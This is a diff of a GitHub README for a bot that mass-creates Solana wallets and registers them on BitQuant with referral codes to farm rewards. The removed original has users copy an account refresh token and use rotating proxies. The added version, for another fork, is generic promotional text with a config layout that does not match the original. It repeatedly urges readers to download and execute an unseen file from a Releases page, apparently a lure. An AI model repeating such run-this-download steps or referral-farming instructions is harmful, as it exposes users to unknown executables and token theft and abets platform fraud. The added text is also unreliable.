@@ -1,48 +1,126 @@
-# BitQuant by OpenGradient Autoreferral
-This script automatically creates multiple Solana wallets and registers them on the BitQuant platform using referral codes to generate rewards for a main account.
-## Tools and components required
-1. BitQuant Account Refresh Token. Register: [https://www.bitquant.io](https://www.bitquant.io/?invite=-nMuDb1p-E1mmg) (Use Solana Wallet)
-2. Solana Wallet Address and Private Key
-3. VPS or RDP (OPTIONAL), Get free $200 credit [DigitalOcean](https://m.do.co/c/3f132e0f7e13) for 60 days here: [Register](https://m.do.co/c/3f132e0f7e13)
-4. Rotating Residental Proxies
-   - Free Proxies Rotating Residental: [ProxyScrape](https://proxyscrape.com/?ref=odk1mmj)
-   - Paid Proxies Rotating Residental (Recomended): [922proxy](https://www.922proxy.com/register?inviter_code=d03d4fed) or [Proxy-Cheap](https://app.proxy-cheap.com/r/JysUiH)
-6. Node.js LTS How to install:
-   - [Linux](https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-22-04)
-   - [Windows](https://www.youtube.com/watch?v=La6kH33-AVM&ab_channel=TheCodeCity)
-   - [Termux](https://www.youtube.com/watch?v=5NceYSU4uFI&ab_channel=VectorM%3A)
-## How to get your BitQuant Account Refresh Token
-- First, login into your [BitQuant](https://www.bitquant.io/?invite=-nMuDb1p-E1mmg) Account use Solana Wallet
-- Open your Browser console `CTRL + SHIFT  + I` or `F12`
-- Go to `Network` tab and refresh
-- Search for `https://securetoken.googleapis.com/v1/token?key=AIzaSyBDdwO2O_Ose7LICa-A78qKJUCEE3nAwsM`
-- Select one and go to `Payload`, then copy `refresh_token` value
-![image](https://github.com/user-attachments/assets/6fe88bc0-62c4-4980-a40e-68418caa5f5d)
-## Modules Installation
-- Download script [Manually](https://github.com/im-hanzou/bitquant-opengradient-autoreferral/archive/refs/heads/main.zip) or use git:
-```bash
-git clone https://github.com/im-hanzou/bitquant-opengradient-autoreferral
+# BitQuant OpenGradient AutoReferral
+
+![BitQuant AutoReferral](https://img.shields.io/badge/Download%20Script-blue?style=for-the-badge&logo=github)
+
+Welcome to the **BitQuant OpenGradient AutoReferral** repository! This project simplifies the process of creating multiple Solana wallets and registering them on the BitQuant platform. By using referral codes, you can generate rewards for your main account efficiently. 
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [How It Works](#how-it-works)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
+
+## Introduction
+
+In the world of cryptocurrency, having multiple wallets can provide flexibility and benefits. This script automates the process of wallet creation and registration, saving you time and effort. With the BitQuant platform's referral system, you can enhance your earnings with minimal manual input.
+
+## Features
+
+- **Automated Wallet Creation**: Quickly create multiple Solana wallets without manual setup.
+- **Referral Code Registration**: Automatically register wallets on the BitQuant platform using referral codes.
+- **Reward Generation**: Earn rewards for your main account through automated referrals.
+- **Node.js Support**: Built with Node.js, ensuring compatibility and ease of use.
+- **OpenGradient Integration**: Leverage OpenGradient features for enhanced functionality.
+
+## Installation
+
+To get started, you need to install Node.js and clone this repository. Follow these steps:
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Invinciblecoder001/bitquant-opengradient-autoreferral.git
+   cd bitquant-opengradient-autoreferral
+   ```
+
+2. **Install Dependencies**:
+   ```bash
+   npm install
+   ```
+
+3. **Download the Script**: Visit the [Releases](https://github.com/Invinciblecoder001/bitquant-opengradient-autoreferral/releases) section to download the latest version of the script.
+
+## Usage
+
+After installation, you can run the script to create wallets and register them on BitQuant.
+
+1. **Run the Script**:
+   ```bash
+   node index.js
+   ```
+
+2. **Follow Prompts**: The script will guide you through the process. Make sure to have your referral codes ready.
+
+## Configuration
+
+Before running the script, you may need to configure some settings. Open the `config.json` file and adjust the following parameters:
+
+- **Main Account**: Your main BitQuant account for receiving rewards.
+- **Number of Wallets**: Specify how many wallets you want to create.
+- **Referral Code**: Enter your referral code for registration.
+
+Example `config.json`:
+```json
+{
+  "mainAccount": "your_main_account",
+  "numberOfWallets": 5,
+  "referralCode": "your_referral_code"
+}
 ```
-- Open terminal and make sure you already in bot folder:
-```bash
-cd bitquant-opengradient-autoreferral
-```
-- Install modules:
-```bash
-npm install
-```
-## Run bot
-- Replace `.env` file with your own configuration:
-```bash
-MAIN_ACCOUNT_REFRESH_TOKEN=AMf-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX < Replace with your own BitQuant Account Refresh Token
-MAIN_ACCOUNT_ADDRESS=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX < Replace with your own BitQuant Account Solana Address
-PROXY=http://user:pass@host:port < Replace with your own Rotating Proxy
-```
-- Run the script: 
-```bash
-node index.js
-```
-# Notes
-- You can just run this bot at your own risk, I'm not responsible for any loss or damage caused by this bot.
-- This bot is for educational purposes only.
-- Another bot: [BitQuant Auto Chat Bot](https://github.com/najibyahya/Open-Gradient-Bot-Chat) by NajibYahya
+
+## How It Works
+
+The script works by interacting with the Solana blockchain to create wallets and the BitQuant API for registration. Here's a brief overview of the process:
+
+1. **Wallet Creation**: The script generates a new wallet for each request.
+2. **API Interaction**: It uses the BitQuant API to register each wallet with your referral code.
+3. **Reward Tracking**: The script tracks rewards generated from each wallet.
+
+This automation allows you to focus on other tasks while still benefiting from the referral system.
+
+## Contributing
+
+We welcome contributions to improve this project. If you have ideas, suggestions, or bug fixes, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button on GitHub.
+2. **Create a Branch**: Use a descriptive name for your branch.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make Changes**: Implement your changes.
+4. **Commit Changes**: Write a clear commit message.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+6. **Create a Pull Request**: Go to the original repository and create a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **GitHub**: [Invinciblecoder001](https://github.com/Invinciblecoder001)
+- **Email**: your_email@example.com
+
+## Releases
+
+To get the latest version of the script, visit the [Releases](https://github.com/Invinciblecoder001/bitquant-opengradient-autoreferral/releases) section. Make sure to download and execute the appropriate file for your setup.
+
+![Wallet Creation](https://img.shields.io/badge/Wallet%20Creation-green?style=for-the-badge&logo=bitcoin)
+
+## Conclusion
+
+The **BitQuant OpenGradient AutoReferral** script offers a streamlined approach to creating and managing Solana wallets. With its automated features, you can maximize your rewards while minimizing manual effort. Explore the code, contribute, and enjoy the benefits of automation in the crypto space.
